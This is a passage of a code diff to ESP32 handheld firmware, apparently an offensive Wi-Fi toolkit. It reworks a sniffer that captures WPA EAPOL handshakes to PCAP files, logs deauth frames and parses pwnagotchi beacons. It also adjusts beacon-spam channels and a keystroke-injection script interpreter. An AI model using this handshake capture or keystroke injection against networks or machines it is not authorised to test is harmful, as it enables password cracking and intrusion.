+    case WIFI_AUTH_WPA2_ENTERPRISE: return "[WPA2-EAP][ESS]";          // alias ENTERPRISE
+#ifdef WIFI_AUTH_WPA3_PSK
+    case WIFI_AUTH_WPA3_PSK: return "[WPA3-SAE][ESS]";
+#endif
+#ifdef WIFI_AUTH_WPA2_WPA3_PSK
+    case WIFI_AUTH_WPA2_WPA3_PSK: return "[WPA2-WPA3-SAE][ESS]";
+#endif
+#ifdef WIFI_AUTH_WAPI_PSK
+    case WIFI_AUTH_WAPI_PSK: return "[WAPI-PSK][ESS]";
+#endif
+#ifdef WIFI_AUTH_OWE
+    case WIFI_AUTH_OWE: return "[OWE][ESS]";
+#endif
+#ifdef WIFI_AUTH_WPA3_ENT_192
+    case WIFI_AUTH_WPA3_ENT_192: return "[WPA3-EAP-192][ESS]";
+#endif
     default: return "[UNKNOWN]";
   }
 }
@@ -11690,7 +12050,7 @@ uint8_t beaconPacket[96] = {
 };
 
 // Sélection des canaux (1–13)
-const uint8_t channels[] = {1,2,3,6,9,11,13};
+const uint8_t channels[] = {1,2,3,6,9,11,12,13};  // +ch12 (ETSI/TELEC) - cf PR #122
 uint8_t channelIndex = 0;
 uint8_t wifi_channel = 1;
 
@@ -12073,151 +12433,62 @@ std::set<String> registeredBeacons;
 unsigned long lastTime = 0;  // Last time update
 unsigned int packetCount = 0;  // Number of packets received
 
+// ---- Handshake/Deauth Sniffing : capture differee (fix issue #80) -----------------------------
+// Le callback promiscuous tourne dans la tache WiFi : il ne doit JAMAIS toucher l'ecran ni la SD.
+// Un acces SPI concurrent avec un dessin de la boucle principale casse le bus -> ecran noir (le
+// programme continue de tourner en fond). Ici le callback ne fait que compter + empiler la trame
+// dans un ring SPSC ; la boucle principale draine le ring (ecriture PCAP, parse pwnagotchi) et
+// dessine en M5GFX. Meme pattern que la capture deauth differee de ce firmware.
+#define HS_CAPQ     8
+#define HS_CAP_BUF  (sizeof(wifi_pkt_rx_ctrl_t) + 400)
+struct HsCap { uint16_t total; uint8_t kind; uint8_t raw[HS_CAP_BUF]; };  // kind 0=eapol 1=beacon 2=pwnagotchi
+static HsCap*            hsCapQ = nullptr;             // alloue seulement pendant le mode
+static volatile uint8_t  hsCapHead = 0, hsCapTail = 0;
+static volatile uint32_t hsPktAcc = 0, hsDropped = 0;
+static volatile uint8_t  hsLastDS[6], hsLastDR[6];    // dernier deauth (pour l'UI)
+static volatile int8_t   hsLastDRssi = 0;
+static volatile uint8_t  hsLastDCh = 0;
+static volatile bool     hsHaveDeauth = false;
+static volatile uint32_t hsPwnaCount = 0;             // pwnagotchi detectes (detection TOUJOURS active)
+
+static void hsEnqueue(const wifi_promiscuous_pkt_t* pkt, uint16_t len, uint8_t kind) {
+  uint8_t next = (hsCapHead + 1) % HS_CAPQ;
+  if (next == hsCapTail) { hsDropped++; return; }     // ring plein -> drop (detection deja comptee)
+  HsCap& c = hsCapQ[hsCapHead];
+  uint16_t total = sizeof(wifi_pkt_rx_ctrl_t) + len;
+  if (total > HS_CAP_BUF) total = HS_CAP_BUF;
+  memcpy(c.raw, pkt, total);
+  if (kind == 1) ((wifi_promiscuous_pkt_t*)c.raw)->rx_ctrl.sig_len -= 4;   // beacon : retire le FCS (comme l'original)
+  c.total = total; c.kind = kind;
+  hsCapHead = next;
+}
+
 void snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
-  packetCount++;
-  unsigned long currentTime = millis();
-  if (currentTime - lastTime >= 1000) {
-    if (packetCount < 100) {
-      M5.Lcd.setCursor(M5.Display.width() - 72, 0);
-    } else {
-      M5.Lcd.setCursor(M5.Display.width() - 81, 0);
-    }
-    M5.Lcd.printf(" PPS:%d ", packetCount);
-
-    lastTime = currentTime;
-    packetCount = 0;
-  }
-
+  hsPktAcc++;
   if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;
+  if (!hsCapQ) return;                                 // mode inactif / buffer libere
+  const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
+  const uint8_t* frame = pkt->payload;
+  uint16_t len = pkt->rx_ctrl.sig_len;
+  if (len < 24) return;
+  const uint16_t fc = (uint16_t)frame[0] | ((uint16_t)frame[1] << 8);
+  const uint8_t fType = (fc & 0x0C) >> 2, fSub = (fc & 0xF0) >> 4;
 
-  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
-  wifi_pkt_rx_ctrl_t ctrl = pkt->rx_ctrl;
-  const uint8_t *frame = pkt->payload;
-  const uint16_t frameControl = (uint16_t)frame[0] | ((uint16_t)frame[1] << 8);
+  if (estUnPaquetEAPOL(pkt)) { nombreDeEAPOL++; hsEnqueue(pkt, len, 0); }
 
-
-  const uint8_t frameType = (frameControl & 0x0C) >> 2;
-  const uint8_t frameSubType = (frameControl & 0xF0) >> 4;
-
-  if (estUnPaquetEAPOL(pkt)) {
-    Serial.println(F("EAPOL Detected !!!!"));
-
-    const uint8_t *receiverAddr = frame + 4;
-    const uint8_t *senderAddr = frame + 10;
-
-    Serial.print(F("Address MAC destination: "));
-    printAddress(receiverAddr);
-    Serial.print(F("Address MAC expedition: "));
-    printAddress(senderAddr);
-
-    enregistrerDansFichierPCAP(pkt, false);
-    nombreDeEAPOL++;
-    M5.Lcd.setCursor(M5.Display.width() - 45, 14);
-    M5.Lcd.printf("H:");
-    M5.Lcd.print(nombreDeHandshakes);
-    if (nombreDeEAPOL < 999) {
-      M5.Lcd.setCursor(M5.Display.width() - 81, 28);
-    } else {
-      M5.Lcd.setCursor(M5.Display.width() - 90, 28);
-    }
-    M5.Lcd.printf("EAPOL:");
-    M5.Lcd.print(nombreDeEAPOL);
+  if (fType == 0x00 && fSub == 0x08) {                 // beacon
+    const uint8_t* s = frame + 10;
+    bool pwna = (s[0]==0xDE && s[1]==0xAD && s[2]==0xBE && s[3]==0xEF && s[4]==0xDE && s[5]==0xAD);
+    if (pwna) hsPwnaCount++;
+    hsEnqueue(pkt, len, pwna ? 2 : 1);
   }
 
-  if (frameType == 0x00 && frameSubType == 0x08) {
-    const uint8_t *senderAddr = frame + 10; // Adresse source dans la trame beacon
-
-    // Convertir l'adresse MAC en chaîne de caractères pour la comparaison
-    char macStr[18];
-    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
-             senderAddr[0], senderAddr[1], senderAddr[2], senderAddr[3], senderAddr[4], senderAddr[5]);
-
-    if (strcmp(macStr, "DE:AD:BE:EF:DE:AD") == 0) {
-      Serial.println(F("-------------------"));
-      Serial.println(F("Pwnagotchi Detected !!!"));
-      Serial.print(F("CH: "));
-      Serial.println(ctrl.channel);
-      Serial.print(F("RSSI: "));
-      Serial.println(ctrl.rssi);
-      Serial.print(F("MAC: "));
-      Serial.println(macStr);
-      Serial.println(F("-------------------"));
-
-      String essid = ""; // Préparer la chaîne pour l'ESSID
-      int essidMaxLength = 700; // longueur max
-      for (int i = 0; i < essidMaxLength; i++) {
-        if (frame[i + 38] == '\0') break; // Fin de l'ESSID
-
-        if (isAscii(frame[i + 38])) {
-          essid.concat((char)frame[i + 38]);
-        }
-      }
-
-      int jsonStart = essid.indexOf('{');
-      if (jsonStart != -1) {
-        String cleanJson = essid.substring(jsonStart); // Nettoyer le JSON
-
-        DynamicJsonDocument json(2048); // Augmenter la taille pour l'analyse
-        DeserializationError error = deserializeJson(json, cleanJson);
-
-        if (!error) {
-          String name = json["name"].as<String>(); // Extraire le nom
-          String pwndnb = json["pwnd_tot"].as<String>(); // Extraire le nombre de réseaux pwned
-          Serial.println("Name: " + name); // Afficher le nom
-          Serial.println("pwnd: " + pwndnb); // Afficher le nombre de réseaux pwned
-          // affichage
-          displayPwnagotchiDetails(name, pwndnb);
-        } else {
-          Serial.println(F("Could not parse Pwnagotchi json"));
-        }
-      } else {
-        Serial.println(F("JSON start not found in ESSID"));
-      }
-    } else {
-      pkt->rx_ctrl.sig_len -= 4;  // Réduire la longueur du signal de 4 bytes
-      enregistrerDansFichierPCAP(pkt, true);  // Enregistrer le paquet
-
-    }
-  }
-
-  // Vérifier si c'est un paquet de désauthentification
-  if (frameType == 0x00 && frameSubType == 0x0C) {
-    // Extraire les adresses MAC
-    const uint8_t *receiverAddr = frame + 4;  // Adresse 1
-    const uint8_t *senderAddr = frame + 10;  // Adresse 2
-    // Affichage sur le port série
-    Serial.println(F("-------------------"));
-    Serial.println(F("Deauth Packet detected !!! :"));
-    Serial.print(F("CH: "));
-    Serial.println(ctrl.channel);
-    Serial.print(F("RSSI: "));
-    Serial.println(ctrl.rssi);
-    Serial.print(F("Sender: ")); printAddress(senderAddr);
-    Serial.print(F("Receiver: ")); printAddress(receiverAddr);
-    Serial.println();
-
-    // Affichage sur l'écran
-    M5.Lcd.setTextColor(WHITE, BLACK);
-    M5.Lcd.setCursor(0, M5.Display.height() / 3 - 14);
-    M5.Lcd.printf("Deauth Detected!");
-    M5.Lcd.setCursor(0, M5.Display.height() / 3 );
-    M5.Lcd.printf("CH: %d RSSI: %d  ", ctrl.channel, ctrl.rssi);
-    M5.Lcd.setCursor(0, M5.Display.height() / 3 + 14);
-    M5.Lcd.print("Send: "); printAddressLCD(senderAddr);
-    M5.Lcd.setCursor(0, M5.Display.height() / 3 + 28);
-    M5.Lcd.print("Receive: "); printAddressLCD(receiverAddr);
+  if (fType == 0x00 && fSub == 0x0C) {                 // deauth
     nombreDeDeauth++;
-    if (nombreDeDeauth < 999) {
-      M5.Lcd.setCursor(M5.Display.width() - 90, 42);
-    } else {
-      M5.Lcd.setCursor(M5.Display.width() - 102, 42);
-    }
-    M5.Lcd.printf("DEAUTH:");
-    M5.Lcd.print(nombreDeDeauth);
-
+    const uint8_t* r = frame + 4; const uint8_t* s = frame + 10;
+    for (int i = 0; i < 6; i++) { hsLastDR[i] = r[i]; hsLastDS[i] = s[i]; }
+    hsLastDRssi = pkt->rx_ctrl.rssi; hsLastDCh = pkt->rx_ctrl.channel; hsHaveDeauth = true;
   }
-  esp_task_wdt_reset();  // S'assurer que le watchdog est réinitialisé fréquemment
-  vTaskDelay(pdMS_TO_TICKS(10));  // Pause pour éviter de surcharger le CPU
 }
 
 void displayPwnagotchiDetails(const String& name, const String& pwndnb) {
@@ -12252,14 +12523,39 @@ void printAddressLCD(const uint8_t* addr) {
 unsigned long lastBtnBPressTime = 0;
 const long debounceDelay = 200;
 
-void deauthDetect() {
-  bool btnBPressed = false;
-  unsigned long lastKeyPressTime = 0;  // Temps de la dernière pression de touche
-  const unsigned long debounceDelay = 300;  // Delai de debounce en millisecondes
+// Liste des pwnagotchis vus (2e fenetre du sniffer) : nom, tete, pwnd, rssi, derniere vue.
+struct PwnaRec { char name[18]; char face[14]; int pwnd; int8_t rssi; uint32_t last; };
+static PwnaRec g_pwnaList[12];
+static int     g_pwnaN = 0;
+static void pwnaUpsert(const char* name, const char* face, int pwnd, int8_t rssi) {
+  if (!name || !name[0]) return;
+  for (int i = 0; i < g_pwnaN; i++) {
+    if (strncmp(g_pwnaList[i].name, name, sizeof g_pwnaList[i].name) == 0) {
+      strncpy(g_pwnaList[i].face, face ? face : "", sizeof g_pwnaList[i].face - 1); g_pwnaList[i].face[sizeof g_pwnaList[i].face - 1] = 0;
+      g_pwnaList[i].pwnd = pwnd; g_pwnaList[i].rssi = rssi; g_pwnaList[i].last = millis();
+      return;
+    }
+  }
+  if (g_pwnaN < (int)(sizeof g_pwnaList / sizeof g_pwnaList[0])) {
+    PwnaRec& r = g_pwnaList[g_pwnaN++];
+    strncpy(r.name, name, sizeof r.name - 1); r.name[sizeof r.name - 1] = 0;
+    strncpy(r.face, face ? face : "", sizeof r.face - 1); r.face[sizeof r.face - 1] = 0;
+    r.pwnd = pwnd; r.rssi = rssi; r.last = millis();
+  }
+}
 
-  M5.Display.clear();
-  M5.Lcd.setTextSize(1.5);
-  M5.Lcd.setTextColor(WHITE, BLACK);
+void deauthDetect() {
+  nombreDeEAPOL = 0; nombreDeHandshakes = 0; nombreDeDeauth = 0;
+  hsDropped = 0; hsPktAcc = 0; hsHaveDeauth = false; hsPwnaCount = 0;
+  g_pwnaN = 0;
+  hsCapHead = hsCapTail = 0;
+  registeredBeacons.clear();
+
+  if (!SD.exists("/evil/handshakes") && !SD.mkdir("/evil/handshakes")) {
+    waitAndReturnToMenu("Cannot create /evil/handshakes"); return;
+  }
+  hsCapQ = (HsCap*)malloc(sizeof(HsCap) * HS_CAPQ);
+  if (!hsCapQ) { waitAndReturnToMenu("Out of memory"); return; }
 
   wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
   esp_wifi_init(&cfg);
@@ -12269,90 +12565,129 @@ void deauthDetect() {
   esp_wifi_set_promiscuous_rx_cb(snifferCallback);
   esp_wifi_set_channel(currentChannelDeauth, WIFI_SECOND_CHAN_NONE);
 
-  int x_btnA = 32;
-  int x_btnB = 140;
-  int y_btns = 122;
+  auto& D = M5.Display;
+  const int W = D.width(), H = D.height();
+  M5Canvas cv(&D); cv.setColorDepth(8); bool spr = cv.createSprite(W, H);
+  const uint16_t BG = menuBackgroundColor, NAVY = menuSelectedBackgroundColor,
+                 GRN = menuTextFocusedColor, WHT = menuTextUnFocusedColor,
+                 RED = TFT_RED, ORG = TFT_ORANGE, CYN = TFT_CYAN, GRY = TFT_DARKGREY, YEL = TFT_YELLOW;
 
-  M5.Lcd.setCursor(x_btnA, y_btns);
-  M5.Lcd.println("Mode:m");
+  String pwnaName = "", pwnaPwnd = "";
+  char lastHsAp[14] = "";
+  uint32_t pps = 0, lastPps = millis();
+  char dMac[18];
+  bool showPwna = false;                                   // 2e fenetre : liste des pwnagotchis vus
 
-  M5.Lcd.setCursor(x_btnB, y_btns);
-  M5.Lcd.println("Back:ok");
-
-  if (!SD.exists("/evil/handshakes") && !SD.mkdir("/evil/handshakes")) {
-    Serial.println(F("Fail to create /handshakes folder"));
-    return;
-  }
   enterDebounce();
-  while (!btnBPressed) {
+  bool quit = false;
+  while (!quit) {
     esp_task_wdt_reset();
-    vTaskDelay(pdMS_TO_TICKS(10));
-    M5.update();
-    cardUpdate();
+    M5.update(); cardUpdate();
+    uint32_t now = millis();
 
-    unsigned long currentPressTime = millis();
-    bool keyPressedEnter = kp(KEY_ENTER);
-
-    if (keyPressedEnter && currentPressTime - lastKeyPressTime > debounceDelay) {
-      btnBPressed = true;
-      lastKeyPressTime = currentPressTime;
+    // ---- drain du ring : ecritures PCAP + parse pwnagotchi (contexte app-task -> SPI OK ici) ----
+    while (hsCapTail != hsCapHead) {
+      HsCap& c = hsCapQ[hsCapTail];
+      wifi_promiscuous_pkt_t* pk = (wifi_promiscuous_pkt_t*)c.raw;
+      if (c.kind == 0) {                               // EAPOL -> PCAP + note l'AP
+        enregistrerDansFichierPCAP(pk, false);
+        const uint8_t* a1 = pk->payload + 4; const uint8_t* a2 = pk->payload + 10; const uint8_t* bs = pk->payload + 16;
+        const uint8_t* ap = (memcmp(a1, bs, 6) == 0) ? a1 : a2;
+        snprintf(lastHsAp, sizeof lastHsAp, "%02X%02X%02X%02X%02X%02X", ap[0],ap[1],ap[2],ap[3],ap[4],ap[5]);
+      } else if (c.kind == 1) {                         // beacon associe (contexte AP)
+        enregistrerDansFichierPCAP(pk, true);
+      } else {                                          // pwnagotchi -> extrait name/pwnd du JSON ESSID
+        // pwnagotchi : le JSON est decoupe en IE de tag 222 (0xDE), 255o max par IE (cf encodeur
+        // pwngridspam send_pwnagotchi_beacon et pwnagotchi _encapsulate). On reassemble en concatenant
+        // la data de chaque IE 0xDE. L'ancienne lecture contigue depuis l'offset 38 injectait les 2 octets
+        // d'en-tete (tag+len) de chaque chunk dans le flux des que le JSON depassait 255o -> JSON corrompu,
+        // deserializeJson echouait (compteur MAC ok mais liste des vus vide).
+        String essid; const uint8_t* f = pk->payload; int ln = (int)pk->rx_ctrl.sig_len;
+        for (int off = 36; off + 2 <= ln; ) {               // 36 = fin de l'en-tete beacon fixe (FC..capability)
+          uint8_t tag = f[off], l = f[off + 1];
+          if (off + 2 + (int)l > ln) break;
+          if (tag == 0xDE) for (int k = 0; k < (int)l; k++) essid += (char)f[off + 2 + k];
+          off += 2 + (int)l;
+        }
+        int js = essid.indexOf('{');
+        if (js >= 0) { DynamicJsonDocument j(2048);
+          if (!deserializeJson(j, essid.substring(js))) {
+            pwnaName = j["name"].as<String>(); pwnaPwnd = j["pwnd_tot"].as<String>();
+            pwnaUpsert(pwnaName.c_str(), j["face"].as<String>().c_str(), j["pwnd_tot"].as<int>(), pk->rx_ctrl.rssi);  // liste des vus
+          }
+        }
+      }
+      hsCapTail = (hsCapTail + 1) % HS_CAPQ;
     }
 
-    if (kp('m') && currentPressTime - lastKeyPressTime > debounceDelay) {
-      autoChannelHop = !autoChannelHop;
-      Serial.println(autoChannelHop ? "Auto Mode" : "Static Mode");
-      lastKeyPressTime = currentPressTime;
-    }
+    if (now - lastPps >= 1000) { lastPps = now; pps = hsPktAcc; hsPktAcc = 0; }
 
+    // ---- touches : m = auto/static, ,// = canal (static), ENTER/DEL = retour ----
+    if (kp(KEY_ENTER) || kp(KEY_BACKSPACE) || kp('`')) { quit = true; break; }
+    if (kp('p')) { showPwna = !showPwna; delay(180); }      // bascule la 2e fenetre pwnagotchi
+    if (kp('m')) { autoChannelHop = !autoChannelHop; delay(170); }
     if (!autoChannelHop) {
-      if (kp(',') && currentPressTime - lastKeyPressTime > debounceDelay) {
-        currentChannelDeauth = currentChannelDeauth > 1 ? currentChannelDeauth - 1 : maxChannelScanning;
-        esp_wifi_set_channel(currentChannelDeauth, WIFI_SECOND_CHAN_NONE);
-        Serial.print(F("Static Channel : "));
-        Serial.println(currentChannelDeauth);
-        lastKeyPressTime = currentPressTime;
-      }
-
-      if (kp('/') && currentPressTime - lastKeyPressTime > debounceDelay) {
-        currentChannelDeauth = currentChannelDeauth < maxChannelScanning ? currentChannelDeauth + 1 : 1;
-        esp_wifi_set_channel(currentChannelDeauth, WIFI_SECOND_CHAN_NONE);
-        Serial.print(F("Static Channel : "));
-        Serial.println(currentChannelDeauth);
-        lastKeyPressTime = currentPressTime;
-      }
-    }
-
-    if (autoChannelHop && currentPressTime - lastChannelHopTime > channelHopInterval) {
+      if (kp(',')) { currentChannelDeauth = currentChannelDeauth > 1 ? currentChannelDeauth - 1 : maxChannelScanning; esp_wifi_set_channel(currentChannelDeauth, WIFI_SECOND_CHAN_NONE); delay(140); }
+      if (kp('/')) { currentChannelDeauth = currentChannelDeauth < maxChannelScanning ? currentChannelDeauth + 1 : 1; esp_wifi_set_channel(currentChannelDeauth, WIFI_SECOND_CHAN_NONE); delay(140); }
+    } else if (now - lastChannelHopTime > channelHopInterval) {
       currentChannelDeauth = (currentChannelDeauth % maxChannelScanning) + 1;
       esp_wifi_set_channel(currentChannelDeauth, WIFI_SECOND_CHAN_NONE);
-      Serial.print(F("Auto Channel : "));
-      Serial.println(currentChannelDeauth);
-      lastChannelHopTime = currentPressTime;
+      lastChannelHopTime = now;
     }
 
-    if (currentChannelDeauth != lastDisplayedChannelDeauth || autoChannelHop != lastDisplayedMode) {
-      M5.Lcd.setCursor(0, 0);
-      M5.Lcd.printf("Channel: %d    \n", currentChannelDeauth);
-      lastDisplayedChannelDeauth = currentChannelDeauth;
+    // ---- rendu M5GFX (sprite double-buffer -> zero flicker, zero acces ecran hors boucle) ----
+    lgfx::LovyanGFX* g = spr ? (lgfx::LovyanGFX*)&cv : (lgfx::LovyanGFX*)&D;
+    if (showPwna) {                                         // ---- 2e fenetre : liste des pwnagotchis vus ----
+      g->fillScreen(BG); g->fillRect(0, 0, W, 15, NAVY);
+      g->setTextSize(1); g->setTextColor(YEL); g->setCursor(4, 4); g->printf("PWNAGOTCHI SEEN %d", g_pwnaN);
+      g->setTextColor(WHT); g->setCursor(W - 42, 4); g->print("p=back");
+      if (g_pwnaN == 0) { g->setTextColor(GRY); g->setCursor(4, 40); g->print("none yet - sniff near a pwnagotchi"); }
+      int yy = 20;
+      for (int i = 0; i < g_pwnaN && yy < H - 10; i++) {
+        uint32_t age = (millis() - g_pwnaList[i].last) / 1000;
+        g->setTextColor(age < 8 ? GRN : GRY); g->setCursor(4, yy);
+        g->printf("%-6.6s %-9.9s pwnd%d %ddBm %lus", g_pwnaList[i].face, g_pwnaList[i].name, g_pwnaList[i].pwnd, g_pwnaList[i].rssi, (unsigned long)age);
+        yy += 12;
+      }
+      if (spr) cv.pushSprite(0, 0);
+      delay(8);
+      continue;
     }
-
-    if (autoChannelHop != lastDisplayedMode) {
-      M5.Lcd.setCursor(0, 12);
-      M5.Lcd.printf("Mode: %s  \n", autoChannelHop ? "Auto" : "Static");
-      lastDisplayedMode = autoChannelHop;
+    g->fillScreen(BG);
+    g->fillRect(0, 0, W, 15, NAVY);
+    g->setTextSize(1); g->setTextColor(GRN); g->setCursor(4, 4); g->print("HANDSHAKE / DEAUTH SNIFF");
+    g->setTextColor(WHT); g->setCursor(W - 52, 4); g->printf("PPS%3lu", (unsigned long)pps);
+    g->setTextSize(2); g->setTextColor(CYN); g->setCursor(4, 20); g->printf("CH %2d", currentChannelDeauth);
+    g->setTextColor(autoChannelHop ? ORG : GRY); g->setCursor(108, 22); g->setTextSize(1); g->print(autoChannelHop ? "AUTO HOP" : "STATIC");
+    g->setTextSize(1);
+    g->setTextColor(GRN); g->setCursor(4, 44); g->printf("Handshakes (AP files): %d", nombreDeHandshakes);
+    g->setTextColor(WHT); g->setCursor(4, 56); g->printf("EAPOL frames         : %d", nombreDeEAPOL);
+    g->setTextColor(nombreDeDeauth ? RED : WHT); g->setCursor(4, 68); g->printf("Deauth frames : %d", nombreDeDeauth);
+    g->setTextColor(hsPwnaCount ? YEL : GRY); g->setCursor(140, 68); g->printf("Pwn: %lu", (unsigned long)hsPwnaCount);
+    int yb = 82;
+    if (lastHsAp[0]) { g->setTextColor(GRN); g->setCursor(4, yb); g->printf("last HS AP %s", lastHsAp); yb += 12; }
+    if (hsHaveDeauth) {
+      snprintf(dMac, sizeof dMac, "%02X:%02X:%02X:%02X:%02X:%02X", hsLastDS[0],hsLastDS[1],hsLastDS[2],hsLastDS[3],hsLastDS[4],hsLastDS[5]);
+      g->setTextColor(ORG); g->setCursor(4, yb); g->printf("deauth ch%d %ddBm %s", hsLastDCh, hsLastDRssi, dMac); yb += 12;
     }
+    if (pwnaName.length()) { g->setTextColor(YEL); g->setCursor(4, yb); g->printf("Pwn: %s (%s)", pwnaName.c_str(), pwnaPwnd.c_str()); }
+    g->fillRect(0, H - 22, W, 22, NAVY);
+    g->setTextColor(WHT); g->setCursor(4, H - 19); g->print(autoChannelHop ? "m=static  p=pwnagotchi" : "m=auto ,//=ch  p=pwnagotchi");
+    g->setTextColor(GRY); g->setCursor(4, H - 9); g->print("ENT/DEL=back  -> /evil/handshakes");
+    if (spr) cv.pushSprite(0, 0);
 
-    delay(10);
+    delay(8);
   }
 
   esp_wifi_set_promiscuous(false);
-  esp_wifi_stop();
   esp_wifi_set_promiscuous_rx_cb(NULL);
+  esp_wifi_stop();
   esp_wifi_deinit();
   esp_wifi_init(&cfg);
   esp_wifi_start();
-  delay(100); // Petite pause pour s'assurer que tout est terminé
-
+  if (spr) cv.deleteSprite();
+  HsCap* tmp = hsCapQ; hsCapQ = nullptr; free(tmp);   // callback voit nullptr avant le free -> pas d'UAF
+  delay(100);
   waitAndReturnToMenu("Stop detection...");
 }
 
@@ -12455,12 +12790,12 @@ void enregistrerDansFichierPCAP(const wifi_promiscuous_pkt_t* packet, bool beaco
   // Ouvrir le fichier en mode ajout si existant sinon en mode écriture
   File fichierPcap = SD.open(nomFichier, fichierExiste ? FILE_APPEND : FILE_WRITE);
   if (!fichierPcap) {
-    Serial.println(F("Échec de l'ouverture du fichier PCAP"));
+    Serial.println(F("Failed to open PCAP file"));
     return;
   }
 
   if (!beacon && !fichierExiste) {
-    Serial.println(F("Écriture de l'en-tête global du fichier PCAP"));
+    Serial.println(F("Writing PCAP global header"));
     ecrireEntetePCAP(fichierPcap);
   }
 
@@ -15670,7 +16005,7 @@ const char* pwnd_names[] PROGMEM = {
 
 // Tâche pour envoyer des trames beacon avec changement de face, de nom et de canal
 void beacon_task(void* pvParameters) {
-  const uint8_t channels[] = {1, 6, 11};  // Liste des canaux Wi-Fi à utiliser
+  const uint8_t channels[] = {1, 6, 11, 12, 13};  // ch 12-13 (ETSI/TELEC) - cf PR #122
   const int num_channels = sizeof(channels) / sizeof(channels[0]);
   const int num_pwnd_faces = sizeof(pwnd_faces) / sizeof(pwnd_faces[0]);
 
@@ -15712,7 +16047,7 @@ void displaySpamStatus() {
   int current_face_index = 0;
   int current_name_index = 0;
   int current_channel_index = 0;
-  const uint8_t channels[] = {1, 6, 11};
+  const uint8_t channels[] = {1, 6, 11, 12, 13};  // ch 12-13 (ETSI/TELEC) - cf PR #122
   const int num_channels = sizeof(channels) / sizeof(channels[0]);
 
   while (spamRunning) {
@@ -16038,7 +16373,7 @@ void key_input(FS &fs, const String &bad_script) {
           }
         } else {
           Command = lineContent.substring(0, lineContent.indexOf(' '));
-          strcpy(Cmd, Command.c_str());
+          strncpy(Cmd, Command.c_str(), sizeof(Cmd) - 1); Cmd[sizeof(Cmd) - 1] = '\0';
           Argument = lineContent.substring(lineContent.indexOf(' ') + 1);
           RepeatTmp = "1";
         }
@@ -16062,20 +16397,20 @@ void key_input(FS &fs, const String &bad_script) {
           if (strcmp(Cmd, "DEFAULTDELAY") == 0 || strcmp(Cmd, "DEFAULT_DELAY") == 0) delay(DEF_DELAY);  else { cmdFail++; }  //100ms
           if (strcmp(Cmd, "STRING") == 0)       { Kb.print(Argument);}                                  else { cmdFail++; }
           if (strcmp(Cmd, "STRINGLN") == 0)     { Kb.println(Argument); }                               else { cmdFail++; }
-          if (strcmp(Cmd, "SHIFT") == 0)        { Kb.press(KEY_LEFT_SHIFT);                                                         if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}  // Save Cmd into OldCmd and then set Cmd = Argument
-          if (strcmp(Cmd, "ALT") == 0)          { Kb.press(KEY_LEFT_ALT);                                                           if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}  // This is made to turn the code faster and to recover
-          if (strcmp(Cmd, "CTRL-ALT") == 0)     { Kb.press(KEY_LEFT_ALT); Kb.press(KEY_LEFT_CTRL);                                  if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}  // the Cmd after the if else statements, in order to
-          if (strcmp(Cmd, "CTRL-SHIFT") == 0)   { Kb.press(KEY_LEFT_CTRL); Kb.press(KEY_LEFT_SHIFT);                                if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}// the Cmd REPEAT work as intended.
-          if (strcmp(Cmd, "CTRL-GUI") == 0)     { Kb.press(KEY_LEFT_CTRL); Kb.press(KEY_LEFT_GUI);                                  if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
-          if (strcmp(Cmd, "ALT-SHIFT") == 0)    { Kb.press(KEY_LEFT_ALT); Kb.press(KEY_LEFT_SHIFT);                                 if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
-          if (strcmp(Cmd, "ALT-GUI") == 0)      { Kb.press(KEY_LEFT_ALT); Kb.press(KEY_LEFT_GUI);                                   if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
-          if (strcmp(Cmd, "GUI-SHIFT") == 0)    { Kb.press(KEY_LEFT_GUI); Kb.press(KEY_LEFT_SHIFT);                                 if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
-          if (strcmp(Cmd, "CTRL-ALT-SHIFT") == 0) { Kb.press(KEY_LEFT_ALT); Kb.press(KEY_LEFT_CTRL); Kb.press(KEY_LEFT_SHIFT);      if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
-          if (strcmp(Cmd, "CTRL-ALT-GUI") == 0)   { Kb.press(KEY_LEFT_ALT); Kb.press(KEY_LEFT_CTRL); Kb.press(KEY_LEFT_GUI);        if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
-          if (strcmp(Cmd, "ALT-SHIFT-GUI") == 0)  { Kb.press(KEY_LEFT_ALT); Kb.press(KEY_LEFT_SHIFT); Kb.press(KEY_LEFT_GUI);       if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
